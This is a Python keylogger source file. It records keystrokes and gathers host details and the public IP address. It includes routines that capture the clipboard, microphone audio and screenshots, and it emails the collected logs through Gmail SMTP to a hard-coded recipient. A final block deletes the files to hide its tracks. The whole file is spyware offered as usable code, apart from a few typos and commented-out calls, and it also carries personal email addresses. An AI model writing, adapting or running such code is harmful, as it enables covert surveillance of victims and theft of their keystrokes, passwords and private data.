#########################
# Libraries / Dependicies
#########################

# Modules to collect Computer Information
import socket
import platform

# Modules to collect screenshots
from multiprocessing import Process, freeze_support
from PIL import ImageGrab

# Modules to collect Clipboard
#import win32clipboard
import clipboard



# Modules to collect Key Stroke
from pynput.keyboard import *

# Modules for email functionality
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib


# Modules to collect time and OS information 
import time 
import os


# Modules to get username information
import getpass
from requests import get

# Modules to collect audio/ to use Microphone
from scipy.io.wavfile import write
import sounddevice as soundDeviceObject

#########################
# Important Variables
#########################
keysInformation = "logs.txt"
systemInformation = "system.txt"
clipboardInformation = "clipboard.txt"
audioInformation = "sample.wav"
sreenshotInformation = "sample.png"



filePath = "/Users/kayvee/Code/KeyLogger/PythonKeyLogger"

recordingTime = 10
timeRounds = 15
numberOfRoundsFinal = 3

#variables for Email 
email_address = "hacker.heart20@gmail.com" # Enter disposable email here
password = "" # Enter email password here
destinationAddr = "Vaibhavsharmakv@gmail.com" # Enter destination addr

#########################
#Email Functionality
#########################
def send_logs_via_email(filename, attachment, destinationAddr):

    sourceAddr = email_address
    messageVar = MIMEMultipart()
    messageVar['From'] = sourceAddr
    messageVar['To'] = destinationAddr
    messageVar['Subject'] = "Log File"

    
    hostname = socket.gethostname()

    body = "System Information" + "\n"+ "Processor: " + platform.processor() + "\n" + "System: " + platform.system() + "Version " + platform.version() + '\n' + "Machine: " + platform.machine() + "\n" +"Hostname: " + hostname + "\n" 



    messageVar.attach(MIMEText(body, 'plain'))

    filename = filename
    attachment = open(attachment, 'rb')

    paraVar = MIMEBase('application', 'octet-stream')
    paraVar.set_payload((attachment).read())
    encoders.encode_base64(paraVar)
    paraVar.add_header('Content-Disposition', "attachment; filename= %s" % filename)
    messageVar.attach(paraVar)

    smtpVar = smtplib.SMTP('smtp.gmail.com', 587)
    smtpVar.starttls()
    smtpVar.login(sourceAddr, password)
    text = messageVar.as_string()
    smtpVar.sendmail(sourceAddr, destinationAddr, text)
    smtpVar.quit()





#########################
#System Information
#########################
def system_Information():
	with open(filePath + "/"+systemInformation,"a") as f:
		hostname = socket.gethostname()
		IPAddr = socket.gethostbyname("")
		try:
			publicIp = get("https://api.ipify.org").text
			f.write("Public IP Address: " + publicIp)

		except Exception:
			f.write("Couldn't get Public IP Address (most likely max query")

		f.write('\n')
		f.write("Processor: " + (platform.processor()) + '\n')
		f.write("System: " + platform.system() + " " + platform.version() + '\n')
		f.write("Machine: " + platform.machine() + "\n")
		f.write("Hostname: " + hostname + "\n")
		f.write("Private IP Address: " + IPAddr + "\n")
		f.write('\n')
		f.write('\n')


system_Information()


#########################
#Copy data from Clipboard
#########################

def copy_data_from_clipboard():
	with open(filePath + "/"+clipboardInformation,"a") as f:
		try:
			clipboardData = clipboard.paste()
			f.write("Clipboard Data: "+clipboardData)
		except Exception as e:
			rf.write("Clipboard Data: NULL")

#copy_data_from_clipboard()


#########################
#Copy Audio
#########################
def record_Audio():
	frameSound = 44100
	seconds = recordingTime
	inputRecording = soundDeviceObject.rec(int(seconds * frameSound), samplerate = frameSound, channels = 2)
	soundDeviceObject.wait()

	write(filePath + "/" + audioInformation, frameSound, inputRecording)

#record_Audio()

#########################
#Screenshots
#########################
def record_screenshot():
	im = ImageGrab.grab()
	im.save(filePath + "/" + sreenshotInformation)

# record_screenshot()


#########################
#Time Control
#########################

numberOfRounds = 0
currentTime = time.time()
stopAtTime = time.time() + timeRounds

while numberOfRounds < numberOfRoundsFinal :


	#########################
	#Key Listener
	#########################

	totalKeys = 0

	keys =[]

	def key_is_pressed(Key):
		global totalKeys,keys,currentTime

		print(Key)
		keys.append(Key)
		totalKeys += 1

		currentTime = time.time()

		if totalKeys >= 1:
			totalKeys = 0
			write_keys_on_file(keys)
			keys=[]


	def write_keys_on_file(keys):
		with open(filePath + "/"+keysInformation,"a") as f:
			for key in keys:
				k = str(key).replace("'","")
				if k.find("space") > 0:
					f.write("\n")
					f.close()
				elif k.find("Key") == -1:
					f.write(k)
					f.close()



	def key_is_released(key):
		if key == Key.esc:
			return False
		if currentTime > stopAtTime:
			return False


	with Listener(on_press = key_is_pressed, on_release = key_is_released) as listener:
		listener.join()

	if currentTime > stopAtTime:
		with open(filePath + "/"+keysInformation,"w") as f:
			f.write(" ")
		# record_screenshot()
		# send_logs_via_email(sreenshotInformation, filePath + "/" + sreenshotInformation, destinationAddr)
		# copy_data_from_clipboard()

		numberOfRounds +=1

		currentTime = time.time()
		stopAtTime = time.time() + timeRounds



# Clean up our tracks and delete files
delete_files = [systemInformation, clipboardInformation, keysInformation, sreenshotInformation, audioInformation]
for file in delete_files:
    os.remove(file_merge + file)






















